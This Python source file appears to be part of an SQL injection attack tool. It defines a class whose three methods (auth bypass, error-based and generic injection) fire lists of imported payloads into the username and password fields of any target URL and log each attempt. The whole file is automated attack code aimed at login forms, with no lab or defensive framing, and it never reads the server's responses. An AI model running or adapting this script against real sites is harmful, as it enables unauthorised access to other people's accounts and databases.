import sys
import os
current_directory = os.getcwd()

sys.path.append(current_directory)
from INFO.common import tables
import requests
from lib.scripts.Fullattackpayload import FullAttackPayload
from lib.regelexpression.extractparameter import extract_parameter_name
from logger.logs import logger
from logger.sqljlog import logger as sqljlog

class FullAttackExploit:
    @staticmethod
    async def auth_bypass_exploit(urls):
        parameter,_ = await extract_parameter_name(urls)
        payload = FullAttackPayload.auth_bypass_payload(column=parameter)
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")

            else:
                logger.critical("Host is down.")
    
    @staticmethod
    async def Error_based_inj_exploit(urls):
        parameter,_ = await extract_parameter_name(urls)
        payload = FullAttackPayload.Error_based_payload()
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")

            else:
                logger.critical("Host is down.")

    @staticmethod
    async def Generic_sql_exploit(urls):
        parameter,_ = await extract_parameter_name(urls)
        payload = FullAttackPayload.Generic_sql_payload(column=parameter)
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")

            else:
                logger.critical("Host is down.")